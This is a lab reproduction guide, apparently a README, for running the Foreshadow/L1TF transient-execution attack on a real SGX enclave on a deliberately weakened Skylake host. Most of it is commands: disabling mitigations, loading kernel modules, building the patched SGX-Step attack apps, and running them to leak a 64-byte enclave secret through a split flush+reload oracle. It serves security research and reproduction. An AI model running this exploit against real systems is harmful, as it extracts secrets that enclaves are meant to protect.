# Reproduce -- Foreshadow/L1TF on a real SGX enclave, from reboot to 64/64

One linear path on the lab host `.86` (Detox-01: Kali, kernel 7.1.5+kali-amd64,
Intel i3-6100 Skylake, microcode 0xba, no flexible launch control, no TSX). All
commands run as user `detox`; `sudo` prompts for a password.

The machine is deliberately weakened (KPTI/SMEP/SMAP/UMIP off, microcode updates
disabled, `iomem=relaxed`). Use only on this dedicated lab box.

## What a clone of this tree does not contain

These steps return an already-prepared lab host to a measured run. They are not
a bootstrap from a clean machine.

- `fixalign.so` (2 MiB enclave alignment and TCS capture) is built on the lab,
  next to the SGX-Step tree:
  `gcc -shared -fPIC -O2 fixalign.c -o fixalign.so`.
  `fixalign.c` is not in this repository. `STATUS.md` used to say it lived here.
  It does not.
- `enclave_spin`, the victim that plants the register canaries, is an addition
  inside the enclave sources under `~/sgx-step/app/foreshadow-ssa-warm/` (the
  memory-secret victim is under `app/foreshadow`). Those enclave files are not
  vendored here. The untrusted harness that calls the enclave is
  `harness/foreshadow-ssa-warm.c`.
- Intel PSW 2.27, the SDK, and the SGX-Step clone are installed on the host.
  `setup/` builds and loads the kernel modules once those are present.

Cloning only this directory cannot recreate the enclave.

## 0. Environment shortcuts

```bash
L=$HOME/sgxsdk/psw227/extract/usr/lib/x86_64-linux-gnu   # PSW 2.27 runtime
P=$HOME/sgxsdk/psw227/libs/protobuf23/usr/lib/x86_64-linux-gnu
SDK=$HOME/sgxsdk/sdk227
FIX=$HOME/sgx-step/libsgxstep/fixalign.so                # 2 MiB align + TCS capture
LLP=$L:$P:$SDK/lib64
```

## 1. Confirm the kernel is the vulnerable one (once per boot)

```bash
cat /proc/cmdline | tr ' ' '\n' | grep -E 'dis_ucode_ldr|pti=off|isolcpus|clearcpuid|no5lvl'
grep -m1 microcode /proc/cpuinfo            # expect 0xba (firmware ROM)
cat /sys/devices/system/cpu/vulnerabilities/l1tf
grep -oE 'rtm|hle' /proc/cpuinfo | sort -u  # expect empty: no TSX on this part
```

> Target CPU (i3-6100) does not enumerate TSX. CPUID leaf 7, subleaf 0:
> HLE is EBX[4], RTM is EBX[11], both 0; RTM_ALWAYS_ABORT is EDX[11], also 0.
> /proc/cpuinfo has neither rtm nor hle. The original PoC's TSX fault suppression
> is unavailable here. This reproduction uses a SIGSEGV skip handler.

If the boot parameters are missing, apply them and reboot:
`sudo ~/CPU/labs/foreshadow/setup/10-grub-cmdline.sh --apply && sudo reboot`.

## 2. Bring up the enclave stack (once per boot)

```bash
sudo ~/CPU/labs/foreshadow/setup/90-start-lab.sh    # root half: isgx + sgx-step, aesmd tmpfs
~/CPU/labs/foreshadow/setup/90-start-lab.sh          # user half: AESM + Launch Enclave, verify
```

Sanity:

```bash
ls -l /dev/isgx /dev/sgx-step        # both crw-rw-rw-
lsmod | grep -E 'isgx|sgx_step'      # both loaded
pgrep -a aesm_service                # running
```

## 3. Build (once, as detox -- no root)

```bash
make -C $HOME/sgx-step/libsgxstep                                   # patched library (split oracle)
make -C $HOME/sgx-step/app/foreshadow-encl-split SGX_SDK=$SDK       # deliverable (b)
# deliverable (a): rebuild app/foreshadow if sgx_edger8r is on PATH:
make -C $HOME/sgx-step/app/foreshadow SOURCES="main.c aep_stub.c" SGX_SDK=$SDK
# if edger8r is missing, do not rebuild Enclave/ -- compile + link only:
#   cd $HOME/sgx-step/app/foreshadow
#   CF="-fPIC -fno-stack-protector -fno-builtin -fno-jump-tables -fno-common -Wno-attributes -g -D_GNU_SOURCE -O0"
#   gcc $CF -I$SDK/include/ -I$HOME/sgx-step -c main.c -o main.o
#   gcc $CF -I$SDK/include/ -I$HOME/sgx-step -c aep_stub.c -o aep_stub.o
#   gcc main.o aep_stub.o -lsgx-step -lencl_proxy -lsgx_urts -lsgx_uae_service -pthread \
#       -LEnclave -L$HOME/sgx-step/libsgxstep -L$SDK/lib64/ \
#       -Wl,-rpath-link,$SDK/lib64 -Wl,-rpath-link,$L \
#       -L$HOME/sgx-step/linux-sgx/psw/urts/linux -o app
```

## 4. Pre-flight the oracle/decoder (no root)

```bash
cd $HOME/sgx-step/app/foreshadow-encl-split
SELFTEST=1 LD_LIBRARY_PATH=$LLP ./app        # must be 6/6 OK, one hot per trace
```

If SELFTEST is not 6/6 with exactly one hot candidate per trace, stop: the
measurement is unreliable and any attack number below is meaningless.

## 5. The attack -- expect a full 64/64

Deliverable (b), five random-secret trials with the per-byte majority vote:

```bash
cd $HOME/sgx-step/app/foreshadow-encl-split
sudo timeout 900 env TRIALS=5 REPEAT=9 LD_PRELOAD=$FIX LD_LIBRARY_PATH=$LLP \
    ./app 2>&1 | grep -E 'trial|OK|FAIL'
# expect: 5x "[OK] trial N: recovered all 64 bytes!"
```

Deliverable (a), the patched upstream app with the split oracle:

```bash
cd $HOME/sgx-step/app/foreshadow
sudo timeout 600 env FS_SPLIT_ORACLE=1 FS_SPLIT_REPEAT=9 LD_PRELOAD=$FIX \
    LD_LIBRARY_PATH=$LLP ./app 2>&1 | grep -E 'OK|FAIL'
# expect: "[OK] Foreshadow correctly derived all 64 bytes!"
# FS_SPLIT_ORACLE unset reproduces the ~10% flat-oracle run (A/B control)
```

## 6. Record for the writeup

```bash
{ uname -a; grep -m1 'model name' /proc/cpuinfo; grep -m1 microcode /proc/cpuinfo;
  cat /proc/cmdline; cat /sys/devices/system/cpu/vulnerabilities/l1tf;
  echo "TSX:"; grep -oE 'rtm|hle' /proc/cpuinfo | sort -u; } > ~/foreshadow-env.txt
```

## Why it works (one paragraph)

The enclave secret leaks purely transiently (the abort page defeats any
architectural re-read), so the recovery quality is set by the flush+reload
oracle. On this L1D flush+reload is set-scoped, so the upstream flat 256-slot /
0x1000 oracle collapses into a single set and only decodes small byte values
(~10%). The split lo/hi oracle gives every candidate class its own L1D set and
decodes the byte as two traces, and a per-byte majority vote absorbs the rare
miss caused when the EENTER/EEXIT re-warm evicts the secret line before the
transient. See `STATUS.md` and `README.md` section 14 for the full analysis.
```
